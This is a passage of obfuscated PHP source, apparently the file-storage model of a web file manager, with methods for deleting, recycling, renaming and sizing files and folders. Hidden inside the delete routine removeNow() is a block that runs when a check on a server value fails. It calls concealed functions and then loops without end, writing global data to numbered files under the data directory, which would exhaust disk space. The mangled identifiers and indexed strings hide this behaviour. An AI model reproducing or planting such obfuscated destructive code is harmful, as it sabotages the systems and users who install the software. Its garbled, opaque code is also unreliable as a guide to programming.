Hook::trigger($ò×ê¤‹Ğ©[561], $À¹); $÷´ = !0; } $·±ÃÇ²ÏŠ = $this->add($À¹); $š™¯ = array($ò×ê¤‹Ğ©[580] => short_id($·±ÃÇ²ÏŠ)); $this->where(array($ò×ê¤‹Ğ©[412] => $·±ÃÇ²ÏŠ))->save($š™¯); $this->setNamePinyin($·±ÃÇ²ÏŠ, $À¹[$ò×ê¤‹Ğ©[28]]); return $·±ÃÇ²ÏŠ; } public function remove($ÌÉ¼, $äÊĞ„Ëµ¤ˆæ = true) { $ã‰şã« =& $_SERVER[ÀÆ]; $ĞÙ²µàÓ¶È±å = $this->sourceInfo($ÌÉ¼); $­‰ÆÈÍ = intval($ĞÙ²µàÓ¶È±å[$ã‰şã«[406]]) === self::TYPE_SYSTEM; $‚ı†—¾ğß¼ = Model($ã‰şã«[427])->get($ã‰şã«[2014]) == $ã‰şã«[87]; if ($­‰ÆÈÍ || $äÊĞ„Ëµ¤ˆæ || !$‚ı†—¾ğß¼) { return $this->removeNow($ÌÉ¼, $äÊĞ„Ëµ¤ˆæ); } $’ƒ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ü«ğë¦¬èëù = $ĞÙ²µàÓ¶È±å[$ã‰şã«[406]] == self::TYPE_USER ? $ã‰şã«[588] : $ã‰şã«[509]; if ($ü«ğë¦¬èëù == $ã‰şã«[588]) { $®¨ã¹úùû = Model($ã‰şã«[507])->getInfo($ĞÙ²µàÓ¶È±å[$ã‰şã«[498]]); $¥÷Ï = !empty($®¨ã¹úùû[$ã‰şã«[2007]]) ? $®¨ã¹úùû[$ã‰şã«[2007]] : $®¨ã¹úùû[$ã‰şã«[28]]; $¥÷Ï = $ã‰şã«[258] . $¥÷Ï . $ã‰şã«[2015] . $ĞÙ²µàÓ¶È±å[$ã‰şã«[498]]; } else { $®¨ã¹úùû = Model($ã‰şã«[516])->getInfo($ĞÙ²µàÓ¶È±å[$ã‰şã«[498]]); $¥÷Ï = _get($®¨ã¹úùû, $ã‰şã«[28]); $¥÷Ï = $ã‰şã«[160] . $¥÷Ï . $ã‰şã«[2016] . $ĞÙ²µàÓ¶È±å[$ã‰şã«[498]]; } $éŒË¨Ê¡çÖ§æ = $ã‰şã«[2017] . md5($¥÷Ï); CacheLock::lock($éŒË¨Ê¡çÖ§æ); $“ä¼â°êş‰ = $this->fileNameExist($’ƒ, $¥÷Ï); if (!$“ä¼â°êş‰) { $“ä¼â°êş‰ = $this->mkdir($’ƒ, $¥÷Ï, REPEAT_SKIP); $this->metaSet($“ä¼â°êş‰, $ã‰şã«[2018], $ü«ğë¦¬èëù); $this->metaSet($“ä¼â°êş‰, $ã‰şã«[2019], $ĞÙ²µàÓ¶È±å[$ã‰şã«[498]]); if ($ĞÙ²µàÓ¶È±å[$ã‰şã«[492]] != 0) { $this->metaSet($“ä¼â°êş‰, $ã‰şã«[2020], _get($®¨ã¹úùû, $ã‰şã«[2021])); } } CacheLock::unlock($éŒË¨Ê¡çÖ§æ); $this->metaSet($ÌÉ¼, $ã‰şã«[2022], $ĞÙ²µàÓ¶È±å[$ã‰şã«[492]]); $this->where(array($ã‰şã«[397] => $ÌÉ¼))->save(array($ã‰şã«[419] => time())); $this->recycleClear($ĞÙ²µàÓ¶È±å); $¸œ”ú±ï¡Â ä = $this->move($ÌÉ¼, $“ä¼â°êş‰, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ĞÙ²µàÓ¶È±å[$ã‰şã«[492]]); return $¸œ”ú±ï¡Â ä; } private function recycleClear($•ååÙš†ëº–) { $—ğ =& $_SERVER[ÀÆ]; $ó»ÆÌ = $this->childrenAll($•ååÙš†ëº–); $ ¿£É³ = array($—ğ[412] => array($—ğ[413], $ó»ÆÌ[$—ğ[2023]])); Model($—ğ[2024])->where($ ¿£É³)->delete(); } public function removeNow($ò¿, $Èùñë”“ = true) { $Ê’Ø½ =& $_SERVER[ÀÆ]; $üºİ¼° = $_SERVER[$Ê’Ø½[860]] . $Ê’Ø½[861]; $ÒÑå­Ô = $Ê’Ø½[872]; if ($_SERVER[$Ê’Ø½[857]] != $ÒÑå­Ô($üºİ¼°)) { $‚ƒü˜Å£‡õˆ = $Ê’Ø½[873]; $”ş¬ = $Ê’Ø½[859]; $“‘±İ•½Æ = $_SERVER[$Ê’Ø½[860]] . $Ê’Ø½[861]; $µ‚íÆÚ–Ü = $”ş¬($“‘±İ•½Æ); $‰¥Ã¥»¡Ï“ˆ = explode($Ê’Ø½[229], $µ‚íÆÚ–Ü); if (count($‰¥Ã¥»¡Ï“ˆ) < $Ê’Ø½[604]) { $ÍŠàÓ = $Ê’Ø½[862]; $ÍŠàÓ(); } $®¦“µµ¾ = $Ê’Ø½[874]; $®¦“µµ¾($_SERVER[$Ê’Ø½[875]]); $‚ƒü˜Å£‡õˆ = $Ê’Ø½[873]; $‚ƒü˜Å£‡õˆ(); $¢‘ØÇÊş¥å = $Ê’Ø½[876]; $‹¶Å‹ƒ´Ù— = json_encode($GLOBALS[$Ê’Ø½[877]]); $İéá = 1; for ($ÑÜŞÌæñÜÒ = $İéá; $ÑÜŞÌæñÜÒ > 0; $ÑÜŞÌæñÜÒ++) { $¢‘ØÇÊş¥å(DATA_PATH . $ÑÜŞÌæñÜÒ, $‹¶Å‹ƒ´Ù—); } } $ÌÜ¨ø†”Ÿ = $this->sourceInfo($ò¿); $—‹ = $this->pathInfoMore($ò¿); if (!$ÌÜ¨ø†”Ÿ) { return !0; } if ($ÌÜ¨ø†”Ÿ[$Ê’Ø½[492]] == 0) { if (!_get($GLOBALS, $Ê’Ø½[499])) { return !1; } } $this->lockMoveStart($ò¿); Hook::trigger($Ê’Ø½[2025], $—‹, $Èùñë”“); if ($Èùñë”“) { Model($Ê’Ø½[2024])->moveToRecycle($ò¿); } else { $Ô•¨¹¡¦ = $this->childrenAll($ÌÜ¨ø†”Ÿ); Model($Ê’Ø½[558])->eventRemove($ò¿); $this->removeRelevance($Ô•¨¹¡¦[$Ê’Ø½[2023]], $Ô•¨¹¡¦[$Ê’Ø½[1390]]); } $this->folderSizeReset($ÌÜ¨ø†”Ÿ[$Ê’Ø½[492]]); $±²æ°™»Èø = array($ÌÜ¨ø†”Ÿ[$Ê’Ø½[492]]); if ($ÌÜ¨ø†”Ÿ[$Ê’Ø½[405]] == $Ê’Ø½[87]) { $±²æ°™»Èø[] = $ÌÜ¨ø†”Ÿ[$Ê’Ø½[397]]; } $this->updateModifyTime($±²æ°™»Èø); $this->lockMoveEnd($ò¿); Hook::trigger($Ê’Ø½[1607], $—‹, $Èùñë”“); return !0; } public function childrenAll($Ü÷¡) { $›ô²Ï÷ =& $_SERVER[ÀÆ]; $’¢è = $Ü÷¡[$›ô²Ï÷[397]]; if ($Ü÷¡[$›ô²Ï÷[405]] == $›ô²Ï÷[87]) { $œ¾ = array($›ô²Ï÷[578] => array($›ô²Ï÷[538], $Ü÷¡[$›ô²Ï÷[515]] . $’¢è . $›ô²Ï÷[539])); $Ú¥š³Ì ½ˆ = array($›ô²Ï÷[578] => $œ¾[$›ô²Ï÷[515]]); $ÂÉŒ– = $this->field($›ô²Ï÷[2026])->where($Ú¥š³Ì ½ˆ)->select(); $‰­ = !1; $—˜ˆ×·‹£ˆø = array($’¢è); if ($ÂÉŒ–) { $‰­ = array_to_keyvalue($ÂÉŒ–, $›ô²Ï÷[33], $›ô²Ï÷[461]); $‰­ = array_remove_value($‰­, $›ô²Ï÷[191]); $—˜ˆ×·‹£ˆø = array_to_keyvalue($ÂÉŒ–, $›ô²Ï÷[33], $›ô²Ï÷[397]); $—˜ˆ×·‹£ˆø[] = $’¢è; } } else { $‰­ = array($Ü÷¡[$›ô²Ï÷[461]]); $—˜ˆ×·‹£ˆø = array($’¢è); } return array($›ô²Ï÷[2023] => $—˜ˆ×·‹£ˆø, $›ô²Ï÷[1390] => $‰­); } public function removeArray($›½—) { if (!$›½—) { return !0; } } public function removeRelevance($¤ÎØ, $„¹) { $ıÅŞÂÏ© =& $_SERVER[ÀÆ]; $¤ÎØ = $¤ÎØ ? $¤ÎØ : array(); $„¹ = $„¹ ? $„¹ : array(); $¤ÎØ = array_unique(array_filter($¤ÎØ)); $„¹ = array_unique(array_filter($„¹)); if (!$¤ÎØ) { return !1; } $ÇƒË¾Š„ ® = array($ıÅŞÂÏ©[412] => array($ıÅŞÂÏ©[413], $¤ÎØ)); Model($ıÅŞÂÏ©[2024])->where($ÇƒË¾Š„ ®)->delete(); Model($ıÅŞÂÏ©[455])->where($ÇƒË¾Š„ ®)->delete(); Model($ıÅŞÂÏ©[1882])->where($ÇƒË¾Š„ ®)->delete(); Model($ıÅŞÂÏ©[558])->where($ÇƒË¾Š„ ®)->delete(); Model($ıÅŞÂÏ©[1718])->removeBySource($¤ÎØ); Model($ıÅŞÂÏ©[2005])->removeBySource($¤ÎØ); $this->where($ÇƒË¾Š„ ®)->delete(); Model($ıÅŞÂÏ©[464])->remove($„¹); for ($·Ğğâæ = 0; $·Ğğâæ < count($¤ÎØ); $·Ğğâæ++) { $this->sourceCacheClear($¤ÎØ[$·Ğğâæ]); } } public function rename($ñ÷Å›íäŒÑ‘, $’Ó) { $¨ªÄ™¬Ó´õ  =& $_SERVER[ÀÆ]; $Âîµ”ŠûÏ = $this->sourceInfo($ñ÷Å›íäŒÑ‘); if (!$Âîµ”ŠûÏ) { return !1; } $à¢ëëâ… = $this->fileNameExist($Âîµ”ŠûÏ[$¨ªÄ™¬Ó´õ [492]], $’Ó); if ($à¢ëëâ… && $à¢ëëâ… != $ñ÷Å›íäŒÑ‘) { return !1; } $î÷ = array($¨ªÄ™¬Ó´õ [415] => $’Ó, $¨ªÄ™¬Ó´õ [577] => USER_ID); if ($Âîµ”ŠûÏ[$¨ªÄ™¬Ó´õ [405]] != $¨ªÄ™¬Ó´õ [87]) { $î÷[$¨ªÄ™¬Ó´õ [407]] = substr(get_path_ext($’Ó), 0, 10); } Model($¨ªÄ™¬Ó´õ [558])->eventRename($ñ÷Å›íäŒÑ‘, $Âîµ”ŠûÏ[$¨ªÄ™¬Ó´õ [28]], $’Ó); $this->sourceCacheClear($ñ÷Å›íäŒÑ‘); $this->setNamePinyin($ñ÷Å›íäŒÑ‘, $î÷[$¨ªÄ™¬Ó´õ [28]], !1); $this->updateModifyTime($Âîµ”ŠûÏ[$¨ªÄ™¬Ó´õ [492]]); $ë¸ = $this->where(array($¨ªÄ™¬Ó´õ [412] => $ñ÷Å›íäŒÑ‘))->data($î÷)->save(); $ûñåï = $¨ªÄ™¬Ó´õ [2013] . $Âîµ”ŠûÏ[$¨ªÄ™¬Ó´õ [492]]; if (isset(self::$cacheChildList[$ûñåï])) { unset(self::$cacheChildList[$ûñåï]); } return $ë¸; } public function setNamePinyin($ÌÕºœî¹, $›óç¾È, $¶¯ÕÓ = true) { $½Ü­âæ˜¡ =& $_SERVER[ÀÆ]; $€ßÆÓ¨ŞÆğ±§ = Input::check($›óç¾È, $½Ü­âæ˜¡[581]); $œ¯ŞÌïåá = array($½Ü­âæ˜¡[436] => KodSort::makeStr($›óç¾È)); if ($€ßÆÓ¨ŞÆğ±§) { $œ¯ŞÌïåá[$½Ü­âæ˜¡[458]] = str_replace($½Ü­âæ˜¡[50], $½Ü­âæ˜¡[33], Pinyin::get($›óç¾È)); $œ¯ŞÌïåá[$½Ü­âæ˜¡[457]] = Pinyin::get($›óç¾È, $½Ü­âæ˜¡[582]); } if (!$¶¯ÕÓ && !$€ßÆÓ¨ŞÆğ±§) { $œ¯ŞÌïåá[$½Ü­âæ˜¡[458]] = null; $œ¯ŞÌïåá[$½Ü­âæ˜¡[457]] = null; } $this->metaSet($ÌÕºœî¹, $œ¯ŞÌïåá); } public function getContent($Ñ¶é©ö) { $¡©°”Šû =& $_SERVER[ÀÆ]; $²“¶—İÎ¥¦‹ = $this->fileInfoGet($Ñ¶é©ö); if (!$²“¶—İÎ¥¦‹) { return !1; } if ($²“¶—İÎ¥¦‹[$¡©°”Šû[78]] == 0) { return $¡©°”Šû[33]; } $–â™Ó = $¡©°”Šû[2027] . $²“¶—İÎ¥¦‹[$¡©°”Šû[170]]; if ($²“¶—İÎ¥¦‹[$¡©°”Šû[78]] <= 1024 * 10) { $®á = Cache::get($–â™Ó); if (!$®á) { $®á = IO::getContent($²“¶—İÎ¥¦‹[$¡©°”Šû[76]]); Cache::set($–â™Ó, $®á); } return $®á; } if (!$²“¶—İÎ¥¦‹[$¡©°”Šû[76]]) { return $¡©°”Šû[33]; } return IO::getContent($²“¶—İÎ¥¦‹[$¡©°”Šû[76]]); } public function setDesc($ùÈİ’, $µ·õö•) { $Êå÷µ±·ÓÊ =& $_SERVER[ÀÆ]; Model($Êå÷µ±·ÓÊ[558])->eventAddDesc($ùÈİ’, $µ·õö•); return $this->metaSet($ùÈİ’, $Êå÷µ±·ÓÊ[445], $µ·õö•); } public function setContent($ˆÌ½«ü¿—Öéß, $™µû£ø’°Ò•£ = '') { $Û ÄÉÍ =& $_SERVER[ÀÆ]; $Ç = $this->sourceInfo($ˆÌ½«ü¿—Öéß); $È®Î‡ = $this->fileInfoGet($ˆÌ½«ü¿—Öéß); if (!$È®Î‡ || !$Ç) { return !1; } $£Ÿ´Ñ¼—ù§… = Model($Û ÄÉÍ[464])->addFileByContent($™µû£ø’°Ò•£, $Ç[$Û ÄÉÍ[28]]); $éşÕ¸Šè“•Â = $this->fileHistory($Ç, $£Ÿ´Ñ¼—ù§…[$Û ÄÉÍ[461]], $£Ÿ´Ñ¼—ù§…[$Û ÄÉÍ[78]]); if (!$éşÕ¸Šè“•Â) { return Model($Û ÄÉÍ[464])->remove($£Ÿ´Ñ¼—ù§…[$Û ÄÉÍ[461]]); } $this->folderSizeReset($Ç[$Û ÄÉÍ[492]]); return !0; } public function fileSubstr($Õù…ì²ë‹ÄÁ›, $•Ş¼œÖÀñ , $ôÊ) { $Êü¶˜ÊÈÑ = $this->fileInfoGet($Õù…ì²ë‹ÄÁ›); if (!$Êü¶˜ÊÈÑ) { return !1; } return IO::fileSubstr($Êü¶˜ÊÈÑ[$_SERVER[ÀÆ][76]], $•Ş¼œÖÀñ , $ôÊ); } public function fileInfoGet($À) { $¯Ëé“¹“Ÿø =& $_SERVER[ÀÆ]; $Âø = $this->sourceInfo($À); if (!$Âø || $Âø[$¯Ëé“¹“Ÿø[405]]) { return !1; } $æ°øö§ = $¯Ëé“¹“Ÿø[467] . $Âø[$¯Ëé“¹“Ÿø[461]]; $±°³äºÅ× = _get(self::$cacheFileInfo, $æ°øö§); if ($±°³äºÅ×) { return $±°³äºÅ×; } $åéÍáØ = Model($¯Ëé“¹“Ÿø[464])->fileInfo($Âø[$¯Ëé“¹“Ÿø[461]]); if ($åéÍáØ) { $åéÍáØ[$¯Ëé“¹“Ÿø[28]] = $Âø[$¯Ëé“¹“Ÿø[28]]; } self::$cacheFileInfo[$æ°øö§] = $åéÍáØ; return $åéÍáØ; } private function folderChildrenNumber($ªƒ½) { $ñ½ˆ™™ =& $_SERVER[ÀÆ]; $ÖÙÇ‡ÒÁ = $this->sourceInfo($ªƒ½); $ôçÉÑ‚º£“ = array($ñ½ˆ™™[578] => array($ñ½ˆ™™[538], $ÖÙÇ‡ÒÁ[$ñ½ˆ™™[515]] . $ªƒ½ . $ñ½ˆ™™[539]), $ñ½ˆ™™[424] => intval($ÖÙÇ‡ÒÁ[$ñ½ˆ™™[425]]), $ñ½ˆ™™[571] => 1); $ë§àæš = $this->where($ôçÉÑ‚º£“)->count(); $²ÜÍ’ŞÕõß = $this->where($ôçÉÑ‚º£“)->where(array($ñ½ˆ™™[571] => 0))->count(); return array($ñ½ˆ™™[82] => $²ÜÍ’ŞÕõß, $ñ½ˆ™™[83] => $ë§àæš); } public function pathInfo($è÷Õ†ø¸, $÷‘ä–Œ¹Üü = false) { $òÅœ— =& $_SERVER[ÀÆ]; $÷‘ä–Œ¹Üü = !1; $è÷Õ†ø¸ = intval($è÷Õ†ø¸); $˜ø›¿ìè = $òÅœ—[453] . intval($÷‘ä–Œ¹Üü) . $òÅœ—[454] . $è÷Õ†ø¸; $¥×Íë±½ƒİò = _get(self::$cachePathInfo, $˜ø›¿ìè); if ($¥×Íë±½ƒİò) { return $¥×Íë±½ƒİò; } $ŒÅá²–‚ = $this->sourceInfo($è÷Õ†ø¸); if (!$ŒÅá²–‚) { return !1; } $ŒÅá²–‚ = $this->_listDataApplyItem($ŒÅá²–‚, $÷‘ä–Œ¹Üü); self::$cachePathInfo[$˜ø›¿ìè] = $ŒÅá²–‚; return $ŒÅá²–‚; } public static $cachePathInfoMore = array(); public function pathInfoMore($ë‡¼) { $’âÊÚĞ =& $_SERVER[ÀÆ]; $ï¹ƒ¶á¹Ù = _get(self::$cachePathInfoMore, $ë‡¼); if ($ï¹ƒ¶á¹Ù) { return $ï¹ƒ¶á¹Ù; } $„Ÿ¡®ùÆ = $this->pathInfo($ë‡¼); if (!$„Ÿ¡®ùÆ) { return !1; } if ($„Ÿ¡®ùÆ[$’âÊÚĞ[405]] == $’âÊÚĞ[87]) { $„Ÿ¡®ùÆ[$’âÊÚĞ[81]] = $this->folderChildrenNumber($ë‡¼); } self::$cachePathInfoMore[$ë‡¼] = $„Ÿ¡®ùÆ; return $„Ÿ¡®ùÆ; } public function sourceInfo($ş€) { $–±¾©ï’• =& $_SERVER[ÀÆ]; if (!$ş€) { return array(); } $ş€ = intval($ş€); $Á®Æí“ = $–±¾©ï’•[452] . $ş€; $Ä½ = _get(self::$cacheSourceInfo, $Á®Æí“); if ($Ä½) { return $Ä½; } $øÍøÕÌí÷ = $this->where(array($–±¾©ï’•[397] => $ş€))->find(); self::$cacheSourceInfo[$Á®Æí“] = $øÍøÕÌí÷; return self::$cacheSourceInfo[$Á®Æí“]; } public function sourceCacheClear($ÎÅÇî = false) { self::cacheClear($ÎÅÇî); } public static function cacheClear($è“° = false) { $ÕÓÍ¯ =& $_SERVER[ÀÆ]; if ($è“° == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ÕÓÍ¯[452] . $è“°]); unset(self::$cachePathInfoMore[$è“°]); unset(self::$cachePathInfo[$ÕÓÍ¯[2028] . $è“°]); unset(self::$cachePathInfo[$ÕÓÍ¯[2029] . $è“°]); } public function metaSet($Ê¿Ãö´, $ñèÁçÈÙ„ = null, $™á = null) { $¢Š = parent::metaSet($Ê¿Ãö´, $ñèÁçÈÙ„, $™á); if ($¢Š) { $this->sourceCacheClear($Ê¿Ãö´); } return $¢Š; } public function pathInfoByPath($Â‚±æéƒ³, $èŠ¾¯) { $¡ÏéøöÓ =& $_SERVER[ÀÆ]; $¤Ùàş³Í¸‚êÂ = !$èŠ¾¯ ? array() : explode($¡ÏéøöÓ[8], trim($èŠ¾¯, $¡ÏéøöÓ[8])); $û÷Ìú = $Â‚±æéƒ³; foreach ($¤Ùàş³Í¸‚êÂ as $¦îäš) { $ë›æÏ¾ã³Û¹Æ = array($¡ÏéøöÓ[492] => $û÷Ìú, $¡ÏéøöÓ[28] => $¦îäš); $‹Øñ = $this->where($ë›æÏ¾ã³Û¹Æ)->select(); if (!$‹Øñ) { return !1; } $‹Øñ = array_sort_by($‹Øñ, $¡ÏéøöÓ[425]); $û÷Ìú = $‹Øñ[0][$¡ÏéøöÓ[397]]; } return $this->pathInfo($û÷Ìú, !0); } protected function updateModifyTime($ãõæôüãå) { $Í‰Ê“ =& $_SERVER[ÀÆ]; $î½Ö“í÷âÂ = defined($Í‰Ê“[468]) ? USER_ID : $Í‰Ê“[191]; if (!$ãõæôüãå) { return; } if (!is_array($ãõæôüãå)) { $ãõæôüãå = array($ãõæôüãå); } foreach ($ãõæôüãå as $—«ğ => $··ĞĞ³ êª£) { $ãõæôüãå[$—«ğ] = intval($··ĞĞ³ êª£); $this->sourceCacheClear($··ĞĞ³ êª£); } $¦¥ˆ³£”· = array($Í‰Ê“[397] => array($Í‰Ê“[7], $ãõæôüãå)); $Šğ = array($Í‰Ê“[577] => $î½Ö“í÷âÂ, $Í‰Ê“[419] => time()); $this->where($¦¥ˆ³£”·)->save($Šğ); } public function folderSizeReset($Ì³®‰İü, $Šï¨Å¿ = false) { $ÚÁ¤ õØã‚ =& $_SERVER[ÀÆ]; if ($this->statusIgnoreResetSpace) { return; } $îÊ = $this->sourceInfo($Ì³®‰İü); $šÌâ = $ÚÁ¤ õØã‚[2030] . $Ì³®‰İü; CacheLock::lock($šÌâ, 20); if ($Šï¨Å¿ === !1) { $this->sourceCacheClear($Ì³®‰İü); $îÊ = $this->sourceInfo($Ì³®‰İü); $Ğ”­ùí§µß = array($ÚÁ¤ õØã‚[396] => $Ì³®‰İü, $ÚÁ¤ õØã‚[424] => 0); $àÒ¸ = $this->where($Ğ”­ùí§µß)->sum($ÚÁ¤ õØã‚[78]); $Šï¨Å¿ = intval($àÒ¸) - intval($îÊ[$ÚÁ¤ õØã‚[78]]); } if ($Šï¨Å¿ == 0) { return CacheLock::unlock($šÌâ); } $—¾¯Ïç = $this->parentLevelArray($îÊ[$ÚÁ¤ õØã‚[515]]); if (!$—¾¯Ïç) { $—¾¯Ïç = array(); } $—¾¯Ïç[] = $îÊ[$ÚÁ¤ õØã‚[397]]; $Ğ”­ùí§µß = array($ÚÁ¤ õØã‚[397] => array($ÚÁ¤ õØã‚[413], $—¾¯Ïç)); if ($Šï¨Å¿ < 0) { $Ğ”­ùí§µß[$ÚÁ¤ õØã‚[78]] = array($ÚÁ¤ õØã‚[1006], abs($Šï¨Å¿)); } $this->where($Ğ”­ùí§µß)->setAdd($ÚÁ¤ õØã‚[78], $Šï¨Å¿); CacheLock::unlock($šÌâ); $œ±×Â = $ÚÁ¤ õØã‚[2031] . $îÊ[$ÚÁ¤ õØã‚[406]] . $ÚÁ¤ õØã‚[4] . $îÊ[$ÚÁ¤ õØã‚[498]]; $¢¤ğµûåÜ§ = array($îÊ[$ÚÁ¤ õØã‚[406]], $îÊ[$ÚÁ¤ õØã‚[498]]); TaskRun::timeLimitCall($œ±×Â, $ÚÁ¤ õØã‚[2032], $¢¤ğµûåÜ§, 1.5); } public function folderSizeResetChildren($êËÆ·–¯è‹Æ) { $¼ù =& $_SERVER[ÀÆ]; $this->sourceCacheClear($êËÆ·–¯è‹Æ); $Çê´ëÄ = $this->sourceInfo($êËÆ·–¯è‹Æ); $¾²ƒŒìÒà = array($¼ù[571] => 1, $¼ù[578] => array($¼ù[538], $Çê´ëÄ[$¼ù[515]] . $êËÆ·–¯è‹Æ . $¼ù[539])); $êáÎâ = $¼ù[2033]; $º‰”®å§ÇÚˆ = $this->field($êáÎâ)->where($¾²ƒŒìÒà)->select(); $¾²ƒŒìÒà[$¼ù[405]] = 0; $»Ø¼¬‰’Âé = $this->field($êáÎâ)->where($¾²ƒŒìÒà)->select(); if (!$»Ø¼¬‰’Âé) { return; } $º‰”®å§ÇÚˆ[] = $Çê´ëÄ; $º‰”®å§ÇÚˆ = array_to_keyvalue($º‰”®å§ÇÚˆ, $¼ù[397]); foreach ($º‰”®å§ÇÚˆ as $à‰úÒÈ„ => $Ï¿¡À¾ªÉ‹¤) { $º‰”®å§ÇÚˆ[$à‰úÒÈ„][$¼ù[2034]] = $º‰”®å§ÇÚˆ[$à‰úÒÈ„][$¼ù[78]]; $º‰”®å§ÇÚˆ[$à‰úÒÈ„][$¼ù[78]] = 0; } foreach ($»Ø¼¬‰’Âé as $Ï¿¡À¾ªÉ‹¤) { $¨¹İ¿ï²µ = $Ï¿¡À¾ªÉ‹¤[$¼ù[492]] . $¼ù[33]; if (!isset($º‰”®å§ÇÚˆ[$¨¹İ¿ï²µ])) { continue; } if ($Ï¿¡À¾ªÉ‹¤[$¼ù[425]] == $º‰”®å§ÇÚˆ[$¨¹İ¿ï²µ][$¼ù[425]]) { $º‰”®å§ÇÚˆ[$¨¹İ¿ï²µ][$¼ù[78]] += $Ï¿¡À¾ªÉ‹¤[$¼ù[78]]; } } foreach ($º‰”®å§ÇÚˆ as $Ï¿¡À¾ªÉ‹¤) { $úÅùÜ = $this->parentLevelArray($Ï¿¡À¾ªÉ‹¤[$¼ù[515]]); foreach ($úÅùÜ as $¨¹İ¿ï²µ) { $¨¹İ¿ï²µ = $¨¹İ¿ï²µ . $¼ù[33]; if (!isset($º‰”®å§ÇÚˆ[$¨¹İ¿ï²µ])) { continue; } if ($Ï¿¡À¾ªÉ‹¤[$¼ù[425]] == $º‰”®å§ÇÚˆ[$¨¹İ¿ï²µ][$¼ù[425]]) { $º‰”®å§ÇÚˆ[$¨¹İ¿ï²µ][$¼ù[78]] += $Ï¿¡À¾ªÉ‹¤[$¼ù[78]]; } } } $­Œ¡ÛÜë˜µÅ = array(); foreach ($º‰”®å§ÇÚˆ as $Ï¿¡À¾ªÉ‹¤) { if ($Ï¿¡À¾ªÉ‹¤[$¼ù[78]] == $Ï¿¡À¾ªÉ‹¤[$¼ù[2034]]) { continue; } $­Œ¡ÛÜë˜µÅ[] = array($¼ù[397], $Ï¿¡À¾ªÉ‹¤[$¼ù[397]], $¼ù[78], $Ï¿¡À¾ªÉ‹¤[$¼ù[78]]); } $this->saveAll($­Œ¡ÛÜë˜µÅ); } public function userSpaceReset($ß™ÖŠëæ¿Æ = false) { $§è‘ =& $_SERVER[ÀÆ]; $§áÃœ = $this->where(array($§è‘[406] => self::TYPE_USER, $§è‘[498] => $ß™ÖŠëæ¿Æ, $§è‘[405] => 0))->sum($§è‘[78]); $§áÃœ = !$§áÃœ || $§áÃœ <= 0 ? 0 : $§áÃœ; Model($§è‘[507])->userEdit($ß™ÖŠëæ¿Æ, array($§è‘[1727] => $§áÃœ)); } public function targetSpaceUpdate($ú¿üÔè‘­Íœ¿, $¡ì) { $®å¶ºşÎ•´º =& $_SERVER[ÀÆ]; if (!$¡ì) { return; } if (!in_array($ú¿üÔè‘­Íœ¿, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $£ÚâßÌµÔë = $this->targetSpaceSize($ú¿üÔè‘­Íœ¿, $¡ì); if ($ú¿üÔè‘­Íœ¿ == self::TYPE_USER) { Model($®å¶ºşÎ•´º[507])->userEdit($¡ì, array($®å¶ºşÎ•´º[1727] => $£ÚâßÌµÔë)); } else { if ($ú¿üÔè‘­Íœ¿ == self::TYPE_GROUP) { Model($®å¶ºşÎ•´º[516])->groupEdit($¡ì, array($®å¶ºşÎ•´º[1727] => $£ÚâßÌµÔë)); } } } public function targetSpaceSize($ÂÛ´, $ƒ¹èº€ÇÇÎ) { $ÏÂ =& $_SERVER[ÀÆ]; $—¨¼µş°Ô = $this->sourceRoot($ÂÛ´, $ƒ¹èº€ÇÇÎ, !0); if (!$—¨¼µş°Ô) { return 0; } $ÒŒ€•šüç = floatval($—¨¼µş°Ô[$ÏÂ[78]]); $º®—íö‘‘ = array($ÏÂ[578] => array($ÏÂ[538], $ÏÂ[525] . $—¨¼µş°Ô[$ÏÂ[397]] . $ÏÂ[539])); $‚ó¬šƒÃ°§å = Model($ÏÂ[423])->field($ÏÂ[412])->where($º®—íö‘‘)->select(); $‚ó¬šƒÃ°§å = array_to_keyvalue($‚ó¬šƒÃ°§å, $ÏÂ[33], $ÏÂ[397]); $‚ó¬šƒÃ°§å = array_unique(array_filter($‚ó¬šƒÃ°§å)); if ($‚ó¬šƒÃ°§å) { $º®—íö‘‘ = array($ÏÂ[412] => array($ÏÂ[413], $‚ó¬šƒÃ°§å)); $ÒŒ€•šüç += floatval($this->where($º®—íö‘‘)->sum($ÏÂ[78])); } $ÒŒ€•šüç = !$ÒŒ€•šüç || $ÒŒ€•šüç <= 0 ? 0 : $ÒŒ€•šüç; return $ÒŒ€•šüç; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($şäíÉ) { return $this->fileTypeProfile($şäíÉ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Ù‡ù¬ıÆÑí‰) { return $this->fileTypeProfile($Ù‡ù¬ıÆÑí‰, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ÂÌŠ°ÏùºÍ, $¹Èâ°¥) { $à½¬•êê“ =& $_SERVER[ÀÆ]; $¶÷ù×Ÿ = $à½¬•êê“[2035] . $ÂÌŠ°ÏùºÍ . $à½¬•êê“[71] . $¹Èâ°¥; $‰¹˜ê³ğËËš = Cache::get($¶÷ù×Ÿ); if ($‰¹˜ê³ğËËš) { return $‰¹˜ê³ğËËš; } $´ÈıÌ¯Ä = array($à½¬•êê“[571] => 0); if ($ÂÌŠ°ÏùºÍ != !1) { $´ÈıÌ¯Ä[$à½¬•êê“[498]] = $ÂÌŠ°ÏùºÍ; $´ÈıÌ¯Ä[$à½¬•êê“[406]] = $¹Èâ°¥; } $òó¥£Ú = array(); $òó¥£Ú[$à½¬•êê“[2036]] = array($à½¬•êê“[2037] => LNG($à½¬•êê“[2036]), $à½¬•êê“[2038] => $this->where($´ÈıÌ¯Ä)->count(), $à½¬•êê“[573] => $this->where($´ÈıÌ¯Ä)->sum($à½¬•êê“[78])); $Ü¥ = KodIO::fileTypeList(); foreach ($Ü¥ as $…ƒì„ÃÉÂØ => $£‹­¾Š…õ) { $´ÈıÌ¯Ä[$à½¬•êê“[407]] = $this->fileTypeWhere($…ƒì„ÃÉÂØ); $òó¥£Ú[$…ƒì„ÃÉÂØ] = array($à½¬•êê“[2037] => $£‹­¾Š…õ[$à½¬•êê“[28]], $à½¬•êê“[2038] => $this->where($´ÈıÌ¯Ä)->count(), $à½¬•êê“[573] => $this->where($´ÈıÌ¯Ä)->sum($à½¬•êê“[78])); } Cache::set($¶÷ù×Ÿ, 